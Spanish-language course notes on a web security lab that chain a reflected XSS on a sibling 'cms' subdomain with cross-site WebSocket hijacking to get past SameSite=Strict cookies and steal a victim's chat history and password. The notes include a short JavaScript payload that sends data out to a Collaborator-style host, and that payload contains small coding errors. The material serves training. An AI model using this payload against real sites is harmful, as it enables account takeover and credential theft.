En esta clase llevamos a cabo un ataque de Cross-Site WebSocket Hijacking (CSWSH) para obtener el historial de chat de una víctima, el cual incluye su usuario y contraseña en texto claro.

La clave está en que la cookie de sesión del sitio tiene la directiva SameSite=Strict, lo que bloquea el uso de cookies en peticiones entre sitios distintos. Sin embargo, el mismo dominio tiene una versión hermana (cms…) vulnerable a XSS, y ambos comparten el mismo site (por definición de navegador).

Esto nos permite lanzar el ataque desde el dominio hermano sin que SameSite lo bloquee. Aprovechamos la XSS reflejada en el login del dominio cms para inyectar un payload JavaScript que establece una conexión WebSocket legítima con el dominio original, simulando el mensaje READY, y exfiltrando la respuesta a un servidor externo (Burp Collaborator).

Esta lección muestra una técnica muy poderosa para eludir restricciones de SameSite y exfiltrar información sensible usando WebSockets en aplicaciones que no implementan protecciones adecuadas

### Parte 2

En esta clase aprovechamos una XSS reflejada en un subdominio hermano para ejecutar un ataque de WebSocket hijacking, exfiltrando el historial de chat de la víctima.

Aunque la cookie de sesión está protegida con la directiva SameSite=Strict, el navegador la enviará si la petición proviene de un mismo sitio, como un subdominio legítimo. La XSS reflejada en cms-lab-id.web-security-academy.net se usa para inyectar un payload que abre un WebSocket al dominio principal, simula el mensaje READY y envía el contenido recibido al servidor de Burp Collaborator.

Esto demuestra cómo una XSS en un dominio hermano puede comprometer por completo la cuenta del usuario, incluso cuando se aplican protecciones modernas como SameSite Strict

-----

En este apartado, vamos a explotar 3 vulnerabilidades anidadas

XSS -> CSRF -> Cross Site WebSocket Hijacking

Vamos a ver las peticiones que hace el chat, para ello definimos el scope para no ver mucha informacion basura

Ahora primeramente, debemos de entablar un webSocket, desde un archivo.js, hacemos lo siguiente:

```javascript

var ws = new WebSocket("https://burpsuite.com/chat");

// Para mandar el primer mensaje al WebSocket
ws.onopen = function(){
  ws.send("READY");
};

// Funcion para obtener la informacion que no da de vuelta el websocket
ws.onmessage = funtion(info){
    fetch("https://colaborator.com/?data=" + btoa(info.data));
};

```

Al mandar esto por el server de burp, nos manda la informacion del chat

Vemos en algunos de los script que usa el chat, vemos un subdominio con nombre CMS...... el cual es un login con la cabecera Access Control Allow Origin

Entonces desde el panel de login nuevo, hay un XSS, alli metemos el script anterior para cap´turar toda la conversacion del usuario victima






